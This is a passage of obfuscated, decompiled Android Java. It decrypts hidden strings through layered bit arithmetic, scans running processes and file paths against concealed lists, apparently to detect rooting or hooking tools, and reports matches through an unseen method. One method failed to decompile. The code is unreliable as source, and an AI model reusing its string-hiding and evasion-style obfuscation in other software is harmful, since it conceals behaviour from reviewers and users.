        long j33 = ((((j32 >>> 4) | j32) & 16711935) << 16) + ((((j29 >>> 4) | j29) & 16711935) << 24);
        long j34 = (j26 >>> 16) & 21845;
        long j35 = ((j34 >>> 1) | j34) & 858993459;
        long j36 = ((j35 >>> 2) | j35) & 252645135;
        long j37 = j26 & 21845;
        long j38 = ((j37 >>> 1) | j37) & 858993459;
        long j39 = ((j38 >>> 2) | j38) & 252645135;
        bArr[9] = (int) ((((((j36 >>> 4) | j36) & 16711935) << 8) + j33) | (((j39 >>> 4) | j39) & 16711935));
        long j40 = -746305836;
        long b5 = c3.b((((((((j40 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48, ((((((((j40 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j40 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j40 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845), j9, 6148914691236517205L);
        long j41 = (b5 >>> 48) & 43690;
        long j42 = ((j41 >>> 2) | (j41 >>> 1)) & 858993459;
        long j43 = ((j42 >>> 2) | j42) & 252645135;
        long j44 = (b5 >>> 32) & 43690;
        long j45 = ((j44 >>> 2) | (j44 >>> 1)) & 858993459;
        long j46 = ((j45 >>> 2) | j45) & 252645135;
        long j47 = ((((j46 >>> 4) | j46) & 16711935) << 16) | ((((j43 >>> 4) | j43) & 16711935) << 24);
        long j48 = (b5 >>> 16) & 43690;
        long j49 = ((j48 >>> 2) | (j48 >>> 1)) & 858993459;
        long j50 = ((j49 >>> 2) | j49) & 252645135;
        long j51 = b5 & 43690;
        long j52 = ((j51 >>> 2) | (j51 >>> 1)) & 858993459;
        long j53 = ((j52 >>> 2) | j52) & 252645135;
        int i3 = (int) ((((j53 >>> 4) | j53) & 16711935) | (((((j50 >>> 4) | j50) & 16711935) << 8) + j47));
        bArr[10] = 417500104 ^ ((((-468093952) - (i3 | (-468093952))) + i3) + 50593804);
        bArr[11] = -25;
        bArr[12] = B0.a(-1, 68);
        bArr[13] = 28;
        bArr[14] = 32;
        bArr[15] = 56;
        bArr[16] = -69;
        bArr[17] = -13;
        bArr[18] = -81;
        bArr[19] = 60;
        bArr[20] = -1;
        long j54 = 1842068792;
        long b6 = c3.b((((((((j54 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48, ((((((((j54 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j54 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j54 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)), j8 + (j7 | j6), 6148914691236517205L);
        long j55 = (b6 >>> 48) & 43690;
        long j56 = ((j55 >>> 2) | (j55 >>> 1)) & 858993459;
        long j57 = ((j56 >>> 2) | j56) & 252645135;
        long j58 = (b6 >>> 32) & 43690;
        long j59 = ((j58 >>> 2) | (j58 >>> 1)) & 858993459;
        long j60 = ((j59 >>> 2) | j59) & 252645135;
        long j61 = ((((j60 >>> 4) | j60) & 16711935) << 16) | ((((j57 >>> 4) | j57) & 16711935) << 24);
        long j62 = (b6 >>> 16) & 43690;
        long j63 = ((j62 >>> 2) | (j62 >>> 1)) & 858993459;
        long j64 = ((j63 >>> 2) | j63) & 252645135;
        long j65 = b6 & 43690;
        long j66 = ((j65 >>> 2) | (j65 >>> 1)) & 858993459;
        long j67 = ((j66 >>> 2) | j66) & 252645135;
        int i4 = 168304642 + (((int) ((((j67 >>> 4) | j67) & 16711935) | ((((j64 >>> 4) | j64) & 16711935) << 8) | j61)) & 22023397);
        bArr[B0.a(190328050 | (~i4), 190328050 - i4)] = 23;
        bArr[22] = -37;
        bArr[23] = -5;
        bArr[24] = 46;
        bArr[25] = -125;
        bArr[26] = 36;
        bArr[27] = -115;
        bArr[28] = 126;
        bArr[29] = -35;
        bArr[30] = 15;
        bArr[31] = 61;
        bArr[32] = -123;
        bArr[33] = 119;
        bArr[34] = -92;
        byte[] bArr2 = new byte[35];
        bArr2[0] = 7;
        bArr2[1] = -42;
        bArr2[2] = 18;
        bArr2[3] = -30;
        bArr2[4] = -44;
        bArr2[5] = -29;
        bArr2[6] = 82;
        bArr2[7] = 58;
        bArr2[8] = -99;
        long j68 = 234897596;
        int i5 = 4;
        long j69 = -1;
        long j70 = ((((((((j68 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j68 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j68 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j68 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + ((((((((j69 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j69 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j69 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j69 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845));
        long j71 = (j70 >>> 48) & 43690;
        long j72 = ((j71 >>> 2) | (j71 >>> 1)) & 858993459;
        long j73 = ((j72 >>> 2) | j72) & 252645135;
        long j74 = (j70 >>> 32) & 43690;
        long j75 = ((j74 >>> 2) | (j74 >>> 1)) & 858993459;
        long j76 = ((j75 >>> 2) | j75) & 252645135;
        long j77 = ((((j76 >>> 4) | j76) & 16711935) << 16) + ((((j73 >>> 4) | j73) & 16711935) << 24);
        long j78 = (j70 >>> 16) & 43690;
        long j79 = ((j78 >>> 2) | (j78 >>> 1)) & 858993459;
        long j80 = ((j79 >>> 2) | j79) & 252645135;
        long j81 = j70 & 43690;
        long j82 = ((j81 >>> 2) | (j81 >>> 1)) & 858993459;
        long j83 = ((j82 >>> 2) | j82) & 252645135;
        bArr2[(((int) ((((j83 >>> 4) | j83) & 16711935) | (((((j80 >>> 4) | j80) & 16711935) << 8) | j77))) + 21172482) ^ 256070071] = -83;
        bArr2[10] = -83;
        bArr2[11] = 3;
        bArr2[12] = -17;
        bArr2[13] = 82;
        bArr2[14] = -119;
        bArr2[15] = 120;
        bArr2[16] = -31;
        bArr2[17] = -46;
        long j84 = -927727104;
        long j85 = -1;
        long j86 = ((((((((j84 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + ((((((((j84 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j84 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j84 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) + ((((((((j85 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j85 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j85 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j85 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845));
        long j87 = (j86 >>> 48) & 43690;
        long j88 = ((j87 >>> 2) | (j87 >>> 1)) & 858993459;
        long j89 = ((j88 >>> 2) | j88) & 252645135;
        long j90 = (j86 >>> 32) & 43690;
        long j91 = ((j90 >>> 2) | (j90 >>> 1)) & 858993459;
        long j92 = ((j91 >>> 2) | j91) & 252645135;
        long j93 = ((((j92 >>> 4) | j92) & 16711935) << 16) + ((((j89 >>> 4) | j89) & 16711935) << 24);
        long j94 = (j86 >>> 16) & 43690;
        long j95 = ((j94 >>> 2) | (j94 >>> 1)) & 858993459;
        long j96 = ((j95 >>> 2) | j95) & 252645135;
        long j97 = j86 & 43690;
        long j98 = ((j97 >>> 2) | (j97 >>> 1)) & 858993459;
        long j99 = ((j98 >>> 2) | j98) & 252645135;
        long j100 = 1215299600;
        long j101 = 0;
        long j102 = (((((j101 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845;
        long j103 = (((((((j101 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16;
        long j104 = j103 + j102;
        long j105 = (((((((j101 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32;
        long j106 = (((((((j101 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48;
        long j107 = (((((((((j100 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j100 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j100 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j100 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + j106 + j105 + j104;
        long j108 = (j107 >>> 48) & 43690;
        long j109 = ((j108 >>> 2) | (j108 >>> 1)) & 858993459;
        long j110 = ((j109 >>> 2) | j109) & 252645135;
        long j111 = (j107 >>> 32) & 43690;
        long j112 = ((j111 >>> 2) | (j111 >>> 1)) & 858993459;
        long j113 = ((j112 >>> 2) | j112) & 252645135;
        long j114 = ((((j113 >>> 4) | j113) & 16711935) << 16) + ((((j110 >>> 4) | j110) & 16711935) << 24);
        long j115 = (j107 >>> 16) & 43690;
        long j116 = ((j115 >>> 2) | (j115 >>> 1)) & 858993459;
        long j117 = ((j116 >>> 2) | j116) & 252645135;
        long j118 = j107 & 43690;
        long j119 = ((j118 >>> 2) | (j118 >>> 1)) & 858993459;
        long j120 = ((j119 >>> 2) | j119) & 252645135;
        long j121 = 71319824;
        long j122 = (int) ((((j120 >>> 4) | j120) & 16711935) + ((((j117 >>> 4) | j117) & 16711935) << 8) + j114);
        long j123 = (((((((((j121 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j121 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j121 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j121 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + (((((((((j122 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j122 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j122 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j122 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + 6148914691236517205L;
        long j124 = (j123 >>> 48) & 43690;
        long j125 = ((j124 >>> 2) | (j124 >>> 1)) & 858993459;
        long j126 = ((j125 >>> 2) | j125) & 252645135;
        long j127 = (j123 >>> 32) & 43690;
        long j128 = ((j127 >>> 2) | (j127 >>> 1)) & 858993459;
        long j129 = ((j128 >>> 2) | j128) & 252645135;
        long j130 = ((((j129 >>> 4) | j129) & 16711935) << 16) | ((((j126 >>> 4) | j126) & 16711935) << 24);
        long j131 = (j123 >>> 16) & 43690;
        long j132 = ((j131 >>> 2) | (j131 >>> 1)) & 858993459;
        long j133 = ((j132 >>> 2) | j132) & 252645135;
        long j134 = ((((j133 >>> 4) | j133) & 16711935) << 8) + j130;
        long j135 = j123 & 43690;
        long j136 = ((j135 >>> 2) | (j135 >>> 1)) & 858993459;
        long j137 = (j136 | (j136 >>> 2)) & 252645135;
        int i6 = (int) (((j137 | (j137 >>> 4)) & 16711935) + j134);
        int i7 = -((int) ((((j99 >>> 4) | j99) & 16711935) + (((((j96 >>> 4) | j96) & 16711935) << 8) | j93)));
        bArr2[(-856407294) ^ ((i6 ^ i7) - ((i7 & (~i6)) * 2))] = 6;
        bArr2[19] = 59;
        bArr2[20] = -70;
        bArr2[21] = 112;
        bArr2[22] = 8;
        bArr2[23] = 8;
        bArr2[24] = -92;
        bArr2[25] = -42;
        bArr2[26] = Byte.MAX_VALUE;
        bArr2[27] = -68;
        bArr2[28] = 52;
        bArr2[29] = -86;
        bArr2[30] = 102;
        bArr2[31] = -96;
        bArr2[32] = -23;
        bArr2[33] = -26;
        bArr2[34] = 75;
        k(bArr, bArr2);
        Charset charset = StandardCharsets.UTF_8;
        String intern2 = new String(bArr, charset).intern();
        byte[] bArr3 = {-126, 27, -91, -29, 107, 24, 41, 56};
        k(bArr3, new byte[]{-42, 52, 83, 8, -31, -107, -45, 14});
        ActivityManager activityManager = (ActivityManager) context.getSystemService(new String(bArr3, charset).intern());
        if (activityManager != null && (runningAppProcesses = activityManager.getRunningAppProcesses()) != null) {
            Iterator<ActivityManager.RunningAppProcessInfo> it = runningAppProcesses.iterator();
            loop0: while (it.hasNext()) {
                String str = it.next().processName;
                if (str != null) {
                    String[] strArr = V.f395f;
                    int length = strArr.length;
                    int i8 = 0;
                    while (true) {
                        if (i8 >= length) {
                            byte[] bArr4 = new byte[i];
                            bArr4[0] = -102;
                            bArr4[1] = 71;
                            bArr4[2] = -49;
                            bArr4[3] = -64;
                            bArr4[4] = 85;
                            long j138 = -832216474;
                            long b7 = c3.b((((((((j138 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48, ((((((((j138 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j138 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j138 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)), j8 + (j7 | j5 | j4), 6148914691236517205L);
                            long j139 = (b7 >>> 48) & 43690;
                            long j140 = ((j139 >>> 2) | (j139 >>> 1)) & 858993459;
                            long j141 = ((j140 >>> 2) | j140) & 252645135;
                            long j142 = (b7 >>> 32) & 43690;
                            long j143 = ((j142 >>> 2) | (j142 >>> 1)) & 858993459;
                            long j144 = ((j143 >>> 2) | j143) & 252645135;
                            long j145 = ((((j144 >>> 4) | j144) & 16711935) << 16) | ((((j141 >>> 4) | j141) & 16711935) << 24);
                            long j146 = (b7 >>> 16) & 43690;
                            long j147 = ((j146 >>> 2) | (j146 >>> 1)) & 858993459;
                            long j148 = ((j147 >>> 2) | j147) & 252645135;
                            long j149 = b7 & 43690;
                            long j150 = ((j149 >>> 2) | (j149 >>> 1)) & 858993459;
                            long j151 = ((j150 >>> 2) | j150) & 252645135;
                            int i9 = ((int) ((((j151 >>> 4) | j151) & 16711935) | (((((j148 >>> 4) | j148) & 16711935) << 8) + j145))) & 375410184;
                            long j152 = -1744827368;
                            long j153 = (((((((((j152 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j152 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j152 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j152 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + j105 + (j103 | j102) + j106;
                            long j154 = (j153 >>> 48) & 43690;
                            long j155 = ((j154 >>> 2) | (j154 >>> 1)) & 858993459;
                            long j156 = ((j155 >>> 2) | j155) & 252645135;
                            long j157 = (j153 >>> 32) & 43690;
                            long j158 = ((j157 >>> 2) | (j157 >>> 1)) & 858993459;
                            long j159 = ((j158 >>> 2) | j158) & 252645135;
                            long j160 = ((((j159 >>> 4) | j159) & 16711935) << 16) | ((((j156 >>> 4) | j156) & 16711935) << 24);
                            long j161 = (j153 >>> 16) & 43690;
                            long j162 = ((j161 >>> 2) | (j161 >>> 1)) & 858993459;
                            long j163 = ((j162 >>> 2) | j162) & 252645135;
                            long j164 = j153 & 43690;
                            long j165 = ((j164 >>> 2) | (j164 >>> 1)) & 858993459;
                            long j166 = ((j165 >>> 2) | j165) & 252645135;
                            byte b8 = b4;
                            Iterator<ActivityManager.RunningAppProcessInfo> it2 = it;
                            long j167 = -2012708560;
                            long j168 = (int) ((((j166 >>> 4) | j166) & 16711935) + ((((j163 >>> 4) | j163) & 16711935) << 8) + j160);
                            long b9 = c3.b((((((((j167 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48, ((((((((j167 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j167 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j167 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)), ((((((((j168 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j168 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j168 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j168 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)), 6148914691236517205L);
                            long j169 = (b9 >>> 48) & 43690;
                            long j170 = ((j169 >>> 2) | (j169 >>> 1)) & 858993459;
                            long j171 = ((j170 >>> 2) | j170) & 252645135;
                            long j172 = (b9 >>> 32) & 43690;
                            long j173 = ((j172 >>> 2) | (j172 >>> 1)) & 858993459;
                            long j174 = ((j173 >>> 2) | j173) & 252645135;
                            long j175 = ((((j174 >>> 4) | j174) & 16711935) << 16) | ((((j171 >>> 4) | j171) & 16711935) << 24);
                            long j176 = (b9 >>> 16) & 43690;
                            long j177 = ((j176 >>> 2) | (j176 >>> 1)) & 858993459;
                            long j178 = ((j177 >>> 2) | j177) & 252645135;
                            long j179 = b9 & 43690;
                            long j180 = ((j179 >>> 2) | (j179 >>> 1)) & 858993459;
                            long j181 = ((j180 >>> 2) | j180) & 252645135;
                            int i10 = i9 + ((int) ((((j181 >>> 4) | j181) & 16711935) | ((((j178 >>> 4) | j178) & 16711935) << 8) | j175));
                            long j182 = -1637298371;
                            long j183 = i10;
                            long j184 = ((((((((j182 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + ((((((((j182 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j182 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j182 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + ((((((((j183 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j183 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j183 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j183 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)));
                            long j185 = (j184 >>> 48) & 21845;
                            long j186 = ((j185 >>> 1) | j185) & 858993459;
                            long j187 = ((j186 >>> 2) | j186) & 252645135;
                            long j188 = (j184 >>> 32) & 21845;
                            long j189 = ((j188 >>> 1) | j188) & 858993459;
                            long j190 = ((j189 >>> 2) | j189) & 252645135;
                            long j191 = ((((j190 >>> 4) | j190) & 16711935) << 16) + ((((j187 >>> 4) | j187) & 16711935) << 24);
                            long j192 = (j184 >>> 16) & 21845;
                            long j193 = ((j192 >>> 1) | j192) & 858993459;
                            long j194 = ((j193 >>> 2) | j193) & 252645135;
                            long j195 = j184 & 21845;
                            long j196 = ((j195 >>> 1) | j195) & 858993459;
                            long j197 = ((j196 >>> 2) | j196) & 252645135;
                            bArr4[(int) ((((j197 >>> 4) | j197) & 16711935) + (((((j194 >>> 4) | j194) & 16711935) << 8) | j191))] = 29;
                            i5 = 4;
                            k(bArr4, new byte[]{-81, 118, 38, 36, 9, 46, -25, 7});
                            Charset charset2 = StandardCharsets.UTF_8;
                            if (str.contains(new String(bArr4, charset2).intern())) {
                                byte[] bArr5 = {81, -67, -122, -18};
                                byte[] bArr6 = new byte[8];
                                bArr6[0] = b8;
                                bArr6[1] = 25;
                                bArr6[2] = -7;
                                long j198 = -1;
                                long j199 = ((((((((j198 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + ((((((((j198 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j198 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j198 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) + (j105 | j104 | j106);
                                long j200 = (j199 >>> 48) & 21845;
                                long j201 = (j200 | (j200 >>> 1)) & 858993459;
                                long j202 = (j201 | (j201 >>> 2)) & 252645135;
                                long j203 = (j199 >>> 32) & 21845;
                                long j204 = ((j203 >>> 1) | j203) & 858993459;
                                long j205 = ((j204 >>> 2) | j204) & 252645135;
                                long j206 = ((((j205 >>> 4) | j205) & 16711935) << 16) + (((j202 | (j202 >>> 4)) & 16711935) << 24);
                                long j207 = (j199 >>> 16) & 21845;
                                long j208 = ((j207 >>> 1) | j207) & 858993459;
                                long j209 = ((j208 >>> 2) | j208) & 252645135;
                                long j210 = j199 & 21845;
                                long j211 = (j210 | (j210 >>> 1)) & 858993459;
                                long j212 = (j211 | (j211 >>> 2)) & 252645135;
                                int i11 = (int) (((j212 | (j212 >>> 4)) & 16711935) | ((((j209 >>> 4) | j209) & 16711935) << 8) | j206);
                                long j213 = 1460771722;
                                long j214 = (1392542089 & ((420466350 ^ i11) + (i11 & 420466350))) ^ 68229632;
                                long j215 = ((((((((j213 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + ((((((((j213 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j213 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j213 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) + (((((((((j214 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j214 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j214 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j214 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))));
                                long j216 = (j215 >>> 48) & 21845;
                                long j217 = (j216 | (j216 >>> 1)) & 858993459;
                                long j218 = (j217 | (j217 >>> 2)) & 252645135;
                                long j219 = (j215 >>> 32) & 21845;
                                long j220 = ((j219 >>> 1) | j219) & 858993459;
                                long j221 = ((j220 >>> 2) | j220) & 252645135;
                                long j222 = (((j218 | (j218 >>> 4)) & 16711935) << 24) | ((((j221 >>> 4) | j221) & 16711935) << 16);
                                long j223 = (j215 >>> 16) & 21845;
                                long j224 = ((j223 >>> 1) | j223) & 858993459;
                                long j225 = ((j224 >>> 2) | j224) & 252645135;
                                long j226 = ((((j225 >>> 4) | j225) & 16711935) << 8) + j222;
                                long j227 = j215 & 21845;
                                long j228 = (j227 | (j227 >>> 1)) & 858993459;
                                long j229 = (j228 | (j228 >>> 2)) & 252645135;
                                bArr6[(int) (((j229 | (j229 >>> 4)) & 16711935) + j226)] = 51;
                                bArr6[4] = 54;
                                bArr6[5] = 110;
                                bArr6[6] = -82;
                                bArr6[7] = -105;
                                k(bArr5, bArr6);
                                intern = new String(bArr5, charset2).intern();
                            } else {
                                i = 6;
                                it = it2;
                                b4 = b8;
                            }
                        } else {
                            if (str.contains(strArr[i8])) {
                                byte[] bArr7 = new byte[i5];
                                // fill-array-data instruction
                                bArr7[0] = -66;
                                bArr7[1] = 114;
                                bArr7[2] = 80;
                                bArr7[3] = 52;
                                byte[] bArr8 = new byte[8];
                                bArr8[0] = -34;
                                bArr8[1] = 85;
                                bArr8[2] = -40;
                                bArr8[3] = -87;
                                bArr8[4] = -114;
                                bArr8[5] = -92;
                                bArr8[i] = -112;
                                bArr8[7] = 87;
                                k(bArr7, bArr8);
                                intern = new String(bArr7, StandardCharsets.UTF_8).intern();
                                break loop0;
                            }
                            i8++;
                            i5 = 4;
                        }
                    }
                    t(intern2, intern);
                    return true;
                }
            }
        }
        return false;
    }

    /* JADX WARN: Code restructure failed: missing block: B:20:0x04df, code lost:
    
        t(r1, r2.intern());
     */
    /* JADX WARN: Code restructure failed: missing block: B:21:0x04e6, code lost:
    
        return true;
     */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    public final boolean H(android.content.Context r50) {
        /*
            Method dump skipped, instructions count: 1392
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: F0.C0017c0.H(android.content.Context):boolean");
    }

    public final boolean I(String str) {
        for (String str2 : V.f391b) {
            StringBuilder h2 = e0.a.h(str2);
            byte[] bArr = {-26};
            long j2 = -1417378308;
            long j3 = -1417378347;
            long j4 = (((((((((j2 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j2 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j2 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j2 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + ((((((((j3 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j3 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j3 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j3 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845));
            long j5 = (j4 >>> 48) & 21845;
            long j6 = ((j5 >>> 1) | j5) & 858993459;
            long j7 = ((j6 >>> 2) | j6) & 252645135;
            long j8 = (j4 >>> 32) & 21845;
            long j9 = ((j8 >>> 1) | j8) & 858993459;
            long j10 = ((j9 >>> 2) | j9) & 252645135;
            long j11 = ((((j10 >>> 4) | j10) & 16711935) << 16) + ((((j7 >>> 4) | j7) & 16711935) << 24);
            long j12 = (j4 >>> 16) & 21845;
            long j13 = ((j12 >>> 1) | j12) & 858993459;
            long j14 = ((j13 >>> 2) | j13) & 252645135;
            long j15 = j4 & 21845;
            long j16 = ((j15 >>> 1) | j15) & 858993459;
            long j17 = ((j16 >>> 2) | j16) & 252645135;
            y(bArr, new byte[]{-58, -114, (int) ((((j17 >>> 4) | j17) & 16711935) | ((((j14 >>> 4) | j14) & 16711935) << 8) | j11), 25, -57, 104, -45, -51});
            Charset charset = StandardCharsets.UTF_8;
            h2.append(new String(bArr, charset).intern());
            h2.append(str);
            if (E1.d(h2.toString()) != null) {
                byte[] bArr2 = new byte[27];
                long j18 = -1186725867;
                long j19 = -1;
                long j20 = (((((j19 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845;
                long j21 = (((((((j19 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16;
                long j22 = (((((((j19 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32;
